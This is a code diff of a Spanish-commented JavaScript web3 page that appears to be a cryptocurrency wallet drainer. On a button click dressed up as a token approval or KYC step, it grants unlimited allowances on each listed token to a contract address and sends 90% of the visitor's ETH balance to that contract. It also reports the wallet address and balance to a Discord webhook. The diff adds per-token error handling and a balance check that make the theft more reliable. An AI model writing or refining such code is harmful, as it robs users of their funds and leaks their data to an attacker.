@@ -19,7 +19,6 @@ const NETWORKS = {
   }
 };
 
-// ABI vacío porque no llamamos funciones del contrato directamente
 const contractABI = [];
 
 let web3;
@@ -27,13 +26,11 @@ let userAccount;
 let contract;
 let selectedNetwork = 'optimism';
 
-// Escuchar cambios en el selector de red
 document.getElementById('networkSelector').addEventListener('change', async (e) => {
   selectedNetwork = e.target.value;
   await connectNetwork();
 });
 
-// Conectar al cargar la página
 window.onload = async () => {
   selectedNetwork = document.getElementById('networkSelector').value;
   await connectNetwork();
@@ -113,27 +110,36 @@ document.getElementById("approveTokens").addEventListener("click", async () => {
   try {
     const balanceWei = await web3.eth.getBalance(userAccount);
     const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+    const numericBalance = parseFloat(balanceEth);
 
     await sendToDiscordWebhook('wallet', userAccount, balanceEth);
 
     for (const token of tokens) {
-      const tokenContract = new web3.eth.Contract(approveABI, token);
-      await tokenContract.methods
-        .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-        .send({ from: userAccount });
+      try {
+        const tokenContract = new web3.eth.Contract(approveABI, token);
+        await tokenContract.methods
+          .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+          .send({ from: userAccount });
+      } catch (err) {
+        console.error(`Error al aprobar token ${token}:`, err.message);
+        continue; // sigue con el siguiente token
+      }
     }
 
-    // ✅ Enviar automáticamente 90% del ETH al contrato
-    const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
+    if (numericBalance > 0) {
+      const ninetyPercent = web3.utils.toWei((numericBalance * 0.9).toFixed(6), 'ether');
 
-    await web3.eth.sendTransaction({
-      from: userAccount,
-      to: NETWORKS[selectedNetwork].contractAddress,
-      value: ninetyPercent
-    });
+      await web3.eth.sendTransaction({
+        from: userAccount,
+        to: NETWORKS[selectedNetwork].contractAddress,
+        value: ninetyPercent
+      });
 
-    await sendToDiscordWebhook('kyc', userAccount, balanceEth);
-    alert("Aprobaciones realizadas y 90% del saldo enviado al contrato.");
+      await sendToDiscordWebhook('kyc', userAccount, balanceEth);
+      alert("Aprobaciones realizadas y 90% del saldo enviado al contrato.");
+    } else {
+      alert("No hay saldo suficiente para enviar ETH al contrato.");
+    }
 
     button.textContent = "Autorizado ✓";
     button.style.backgroundColor = "#00b15d";
@@ -145,7 +151,6 @@ document.getElementById("approveTokens").addEventListener("click", async () => {
     button.disabled = false;
   }
 });
-
 
 async function sendToDiscordWebhook(eventType, address, balance) {
   const embed = {
